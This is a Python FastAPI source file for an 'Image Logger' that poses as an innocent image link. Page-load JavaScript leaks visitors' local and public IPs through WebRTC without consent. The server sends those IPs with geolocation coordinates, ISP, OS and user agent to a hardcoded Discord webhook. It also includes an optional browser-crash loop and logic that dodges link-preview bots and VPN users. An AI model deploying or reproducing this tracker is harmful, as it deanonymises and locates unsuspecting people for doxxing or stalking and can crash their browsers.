from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, RedirectResponse, Response
import requests
import httpagentparser

app = FastAPI()

config = {
    "webhook": "https://discord.com/api/webhooks/1533168835316682854/TKTyWeqHd99G3wbXyYZeCd2n6-JocDtoNKSju2cuoOYNnUtCa0iXwTAyy_CVLHf9EnAF",
    "image": "https://raw.githubusercontent.com/assettomods117-pixel/IMAGE-LOGGER/refs/heads/main/06e21ef5-4be3-4274-b7c0-681adbd313b8.jpeg",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "buggedImage": False,
    "vpnCheck": 1,
    "antiBot": 1,
    "linkAlerts": True,
}

blacklistedIPs = ("27", "104", "143", "164")

def bot_check(ip: str, useragent: str):
    if not ip:
        return False
    if ip.startswith(("34.", "35.")):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def make_report(ip: str, useragent: str, endpoint: str = "/api/image", webrtc_ips: list = None):
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = bot_check(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": (
                            f"**Link foi enviado!**\n\n"
                            f"**Endpoint:** `{endpoint}`\n"
                            f"**IP:** `{ip}`\n"
                            f"**Platform:** `{bot}`"
                        )
                    }]
                }, timeout=8)
            except:
                pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=6).json()
    except:
        info = {}

    ping = "@everyone"

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 2:
            return
        if config["antiBot"] == 1:
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    # Format WebRTC leaked IPs if collected
    webrtc_section = ""
    if webrtc_ips:
        unique = list(dict.fromkeys(webrtc_ips))  # preserve order, dedupe
        formatted = "\n".join(f"> `{addr}`" for addr in unique)
        webrtc_section = f"\n**WebRTC Leaked IPs:**\n{formatted}\n"

    description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False)}`
{webrtc_section}
**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```"""

    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": ping,
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": description,
                "thumbnail": {"url": config["image"]}
            }]
        }, timeout=8)
    except:
        pass


@app.post("/api/webrtc")
async def webrtc_collect(request: Request, background_tasks: BackgroundTasks):
    """
    Receives WebRTC ICE candidates POSTed by the client-side collector.
    Fires a follow-up Discord report with the leaked IPs attached.
    """
    try:
        body = await request.json()
    except:
        return Response(status_code=204)

    ip = request.headers.get("x-forwarded-for") or (
        request.client.host if request.client else "Unknown"
    )
    if "," in str(ip):
        ip = ip.split(",")[0].strip()

    useragent = request.headers.get("user-agent", "")
    webrtc_ips: list[str] = body.get("ips", [])

    if webrtc_ips:
        background_tasks.add_task(make_report, ip, useragent, "/api/webrtc", webrtc_ips)

    return Response(status_code=204)


def _build_html(crash: bool) -> str:
    """
    Returns the logger HTML page.

    WebRTC collector logic:
      - Opens an RTCPeerConnection with a public STUN server (Google 8.8.8.8:3478).
      - Creates a dummy data channel to force ICE candidate generation.
      - Parses srflx (server-reflexive) and host candidates from the SDP.
      - Deduplicates, then POSTs the list to /api/webrtc before the connection closes.
      - No prompt, no user interaction, no permissions required.
    """
    crash_script = ""
    if crash:
        crash_script = """
<script>
setTimeout(function(){
    for(var i=69420;i==i;i*=i){console.log(i)}
}, 150);
</script>"""

    webrtc_script = """
<script>
(function(){
    var ips = [];
    var seen = {};

    function extractIPs(sdp) {
        var lines = sdp.split('\\n');
        for (var i = 0; i < lines.length; i++) {
            var line = lines[i].trim();
            // candidate lines: a=candidate:... typ host/srflx/relay
            if (line.indexOf('a=candidate:') === 0 || line.indexOf('candidate:') === 0) {
                var parts = line.split(' ');
                // parts[4] is the IP address in standard ICE candidate format
                if (parts.length > 4) {
                    var ip = parts[4];
                    var typ = parts.length > 7 ? parts[7] : '';
                    // capture host (LAN) and srflx (real public IP behind NAT)
                    if ((typ === 'host' || typ === 'srflx') && !seen[ip]) {
                        seen[ip] = true;
                        ips.push(ip);
                    }
                }
            }
        }
    }

    try {
        var pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });

        // Data channel forces ICE gathering even without media tracks
        pc.createDataChannel('x');

        pc.onicecandidate = function(e) {
            if (e.candidate && e.candidate.candidate) {
                extractIPs(e.candidate.candidate);
            }
        };

        pc.onicegatheringstatechange = function() {
            if (pc.iceGatheringState === 'complete') {
                pc.close();
                if (ips.length > 0) {
                    fetch('/api/webrtc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ips: ips })
                    }).catch(function(){});
                }
            }
        };

        pc.createOffer().then(function(offer) {
            return pc.setLocalDescription(offer);
        }).catch(function(){});

    } catch(err) {}
})();
</script>"""

    return f"""<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title></title></head>
<body style="margin:0;padding:0;overflow:hidden;">
<div style="background-image:url('{config["image"]}');background-size:contain;background-repeat:no-repeat;background-position:center;width:100vw;height:100vh;"></div>
{webrtc_script}{crash_script}
</body>
</html>"""


@app.get("/")
@app.get("/api/image")
async def logger(request: Request, background_tasks: BackgroundTasks):
    ip = request.headers.get("x-forwarded-for") or (
        request.client.host if request.client else "Unknown"
    )
    if "," in str(ip):
        ip = ip.split(",")[0].strip()

    useragent = request.headers.get("user-agent", "")

    if bot_check(ip, useragent):
        make_report(ip, useragent)
        if config["buggedImage"]:
            return Response(content=b"", media_type="image/jpeg")
        return RedirectResponse(url=config["image"], status_code=302)

    background_tasks.add_task(make_report, ip, useragent)

    if config["crashBrowser"]:
        return HTMLResponse(content=_build_html(crash=True))

    return HTMLResponse(content=_build_html(crash=False))
